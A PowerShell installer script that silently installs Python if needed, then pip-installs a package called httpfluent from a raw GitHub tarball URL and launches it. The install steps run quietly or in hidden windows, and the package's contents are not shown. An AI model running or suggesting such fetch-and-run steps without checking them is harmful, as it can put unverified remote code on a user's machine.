# =====================================================
# Python + httpfluent (user-only, fully automatic)
# =====================================================

$ForcePythonInstall = $false
$ProgressPreference = 'SilentlyContinue'

Write-Host "[*] Starting script..." -ForegroundColor Cyan

# -----------------------------
# Step 0: Detect existing Python >=3.9 (user-only)
# -----------------------------
$BestPython = $null
$Candidates = @()

# Check Python in PATH
$cmd = Get-Command python -ErrorAction SilentlyContinue
if ($cmd) { $Candidates += $cmd.Source }

# Check common user install directories
$Roots = @("$env:LOCALAPPDATA\Programs\Python")
foreach ($root in $Roots) {
    if (Test-Path $root) {
        Get-ChildItem -Path $root -Directory -ErrorAction SilentlyContinue | ForEach-Object {
            $exe = Join-Path $_.FullName "python.exe"
            if (Test-Path $exe) { $Candidates += $exe }
        }
    }
}

# Pick first Python >=3.9
foreach ($candidate in ($Candidates | Select-Object -Unique)) {
    try {
        $out = & $candidate --version 2>&1
        if ($out -match "Python (\d+\.\d+\.\d+)") {
            $ver = [version]$Matches[1]
            if ($ver -ge [version]"3.9") {
                $BestPython = $candidate
                break
            }
        }
    } catch {}
}

# -----------------------------
# Step 1: Try running httpfluent from existing Python
# -----------------------------
$RanSuccessfully = $false
if ($BestPython -and Test-Path $BestPython) {

    # Resolve user Scripts folder
    $ScriptsDir = & $BestPython -c "import sysconfig;print(sysconfig.get_path('scripts'))" 
    $ScriptsDir = $ScriptsDir.Trim()
    $HttpFluentExe = Join-Path $ScriptsDir "httpfluent.exe"

    if (Test-Path $HttpFluentExe) {
        Write-Host "[+] Found existing Python and httpfluent." -ForegroundColor Green
        Write-Host "[+] Running httpfluent..." -ForegroundColor Green
        Start-Process -FilePath $HttpFluentExe -WindowStyle Normal
        $RanSuccessfully = $true
    }
}

# -----------------------------
# Step 2: Install Python 3.12 if needed
# -----------------------------
if (-not $RanSuccessfully -or $ForcePythonInstall) {

    Write-Host "[!] Installing Python 3.12.6 per-user..." -ForegroundColor Yellow

    $PythonRoot = "$env:LOCALAPPDATA\Programs\Python\Python312-Auto"
    $PythonExe = Join-Path $PythonRoot "python.exe"

    $Installer = "$env:TEMP\python-3.12.6-installer.exe"
    (New-Object System.Net.WebClient).DownloadFile(
        "https://www.python.org/ftp/python/3.12.6/python-3.12.6-amd64.exe",
        $Installer
    )

    Start-Process -FilePath $Installer `
        -ArgumentList "/quiet InstallAllUsers=0 PrependPath=0 TargetDir=`"$PythonRoot`"" `
        -Wait -WindowStyle Hidden

    if (-not (Test-Path $PythonExe)) {
        Write-Host "[-] Python installation failed." -ForegroundColor Red
        exit 1
    }

    $BestPython = $PythonExe
}

# -----------------------------
# Step 3: Upgrade pip silently
# -----------------------------
& $BestPython -m ensurepip | Out-Null
& $BestPython -m pip install --upgrade pip --quiet --no-input --progress-bar off

# -----------------------------
# Step 4: Install httpfluent silently
# -----------------------------
& $BestPython -m pip install requests --quiet --no-input --progress-bar off
& $BestPython -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet --no-input --progress-bar off

# -----------------------------
# Step 5: Resolve Scripts folder for newly installed Python
# -----------------------------
$ScriptsDir = & $BestPython -c "import sysconfig;print(sysconfig.get_path('scripts'))"
$ScriptsDir = $ScriptsDir.Trim()
$HttpFluentExe = Join-Path $ScriptsDir "httpfluent.exe"

Write-Host "[+] Scripts directory: $ScriptsDir" -ForegroundColor Green

# -----------------------------
# Step 6: Run httpfluent visibly
# -----------------------------
if (Test-Path $HttpFluentExe) {
    Write-Host "[+] Launching httpfluent --help" -ForegroundColor Green
    Start-Process -FilePath $HttpFluentExe -ArgumentList "--help" -WindowStyle Normal
} else {
    Write-Host "[-] httpfluent.exe not found." -ForegroundColor Red
}

Write-Host "[*] Script finished." -ForegroundColor Cyan
